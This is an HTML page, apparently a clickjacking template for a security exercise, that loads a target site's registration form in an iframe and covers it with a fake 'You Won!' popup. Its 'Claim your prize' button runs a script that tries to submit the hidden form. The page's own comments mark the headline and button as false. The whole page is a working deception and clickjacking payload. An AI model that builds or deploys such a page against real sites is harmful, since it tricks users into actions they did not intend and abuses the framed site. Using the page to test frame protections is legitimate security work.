<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>You Won!</title>
    <style>
        /* Ustawienie kontenera na środku ekranu */
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
        }

        /* Styl iframe, bez cienia i zaokrągleń */
        iframe {
            width: 90vw;
            max-width: 600px;
            height: 80vh;
            max-height: 600px;
            border: none;
            overflow: hidden;
            position: relative;
            z-index: 1;
        }

        /* Styl okna popup z cieniem, aby się wyróżniało */
        .popup {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            padding: 20px;
            background-color: white;
            border: 2px solid #333;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            border-radius: 8px;
            text-align: center;
            z-index: 2;
        }

        /* Nagłówek w popup */
        .popup .message {
            font-size: 1.5em;
            font-weight: bold;
            color: green;
            margin-bottom: 15px;
        }

        /* Przycisk w popup */
        .popup .fake-button {
            padding: 10px 20px;
            font-size: 1.2em;
            color: white;
            background-color: blue;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Embedding the registration form in an iframe without scrolling -->
        <iframe id="targetFrame" src="{{ ngrok_url }}/register_html" frameborder="0" scrolling="no"></iframe>

        <!-- Popup with a fake message and a button in the middle of the screen -->
        <div class="popup">
            <div class="message">You Won!</div> <!-- False headline -->
            <button class="fake-button" onclick="claimPrize()">Claim your prize</button> <!-- False button -->
        </div>
    </div>

    <script>
        // Function to submit a form in an iframe after clicking a fake button
        function claimPrize() {
            const iframe = document.getElementById('targetFrame');
            try {
                iframe.contentWindow.document.getElementById('registerForm').submit();
            } catch (error) {
                console.error("Access to iframe content denied due to security policy.");
            }
        }
    </script>
</body>
</html>
